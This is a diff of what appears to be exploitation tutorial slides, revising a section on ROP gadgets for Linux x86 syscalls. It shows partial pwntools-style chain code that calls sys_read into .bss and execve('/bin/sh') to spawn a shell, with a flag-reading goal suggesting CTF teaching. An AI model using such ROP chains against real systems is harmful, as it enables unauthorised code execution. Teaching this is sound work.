@@ -43,15 +43,23 @@ int 0x80    ; call kernel
 ```
 
 ---
-# [fit] gadget for system call
+# gadget for system call
+
+- pop reg, ret
+- int 0x80, ret
+
+### Useful exploit
+
+- open("flag"), read(buf,size,), write(buf, size, )
+- execve("/bin/sh", NULL, NULL)
+- [security - system() vs execve() - Stack Overflow](https://stackoverflow.com/questions/27461936/system-vs-execve)
+
+
+
+---
+## read(0, e.bss(), 0x8)
 
 ```
-pop reg, ret
-int 0x80, ret
-```
-
-```
-# read(0, e.bss(), 0x8)
 ex += p32(pop_eax)              # pop eax
 ex += p32(0x3)                  # number of systemcall sys_read
 ex += p32(pop_edx_edx_ebx_ret)  # pop edx/ecx/ebx
@@ -62,9 +70,9 @@ ex += p32(int0x80)              # invoke system calls in Linux on x86
 ```
 
 ---
+## execve("/bin/sh",NULL, NULL)
 
 ```
-# execve("/bin/sh",NULL, NULL)
 ex += p32(pop_eax)              # pop eax
 ex += p32(0xb)                  # number of systemcall sys_execve
 ex += p32(pop_edx_edx_ebx_ret)  # pop edx/ecx/ebx
